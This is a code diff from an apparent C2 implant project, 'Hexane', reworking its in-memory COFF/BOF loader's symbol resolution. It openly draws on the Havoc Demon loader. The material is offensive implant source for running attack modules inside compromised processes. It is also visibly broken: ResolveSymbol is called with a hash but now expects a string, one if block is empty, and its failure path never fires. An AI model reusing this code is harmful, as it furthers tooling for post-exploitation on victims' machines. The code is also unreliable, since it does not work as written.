@@ -138,11 +138,9 @@ namespace Memory {
             char        symbol_name[9]  = { };
             char        *entry_name     = { };
             _symbol     *symbol         = { };
-
-            bool        success         = true;
             void        *function       = { };
 
-            uintptr_t   offset          = 0;
+            bool        success         = true;
             uint32_t    count           = 0;
 
             for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
@@ -166,8 +164,12 @@ namespace Memory {
                     void *fn_map    = object->fn_map + sizeof(void*) * count;
 
                     auto hash = Utils::GetHashFromStringA(entry_name, x_strlen(entry_name));
-                    if ((function = C_PTR(ResolveSymbol(object, hash, symbol->Type))))      // if (function != nullptr)
-#undef _WIN64
+
+                    if (!ResolveSymbol(object, hash, symbol->Type, &function)) {
+                        success_(false);
+                    }
+
+                    if (function)
 #ifdef _WIN64
                     {
                         if (object->reloc->Type == IMAGE_REL_AMD64_REL32) {
@@ -228,30 +230,28 @@ namespace Memory {
             return success;
         }
 
-        UINT_PTR ResolveSymbol(_executable *object, const uint32_t entry_name, uint32_t type) {
+        BOOL ResolveSymbol(_executable *object, const char* entry_name, uint32_t type, void** function) {
             // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/CoffeeLdr.c#L87
             HEXANE
 
             uintptr_t   address     = { };
             char        *lib_name   = { };
             char        *fn_name    = { };
+            bool        success     = true;
 
-            x_assert(address = Memory::Objects::GetInternalAddress(entry_name));
-            address = 1;
+            *function = nullptr;
+            auto hash = Utils::GetHashFromStringA(entry_name, x_strlen(entry_name));
 
-                /*
-                 * todo: Finish BOF loader ResolveSymbol and GetInternalAddress
-                 * ok, hear me out:
-                 *      auto name = "__imp_NTDLL$NtAllocateVirtualMemory" or "__Hexane$OpenUserProcess"
-                 *      map[string]string = strings.Split(name, "$")
-                 *
-                 *      LoadExport(module, function);
-                 */
+            if (!(address = Memory::Objects::GetInternalAddress(hash))) {
 
-            address = Modules::LoadExport(lib_name, fn_name);
+            }
+            /*
+             * else if (IsImport() && !IncludesLib())
+             * else if (IsImport())
+             */
 
             defer:
-            return address;
+            return success;
         }
 
         SIZE_T GetFunctionMapSize(_executable *object) {
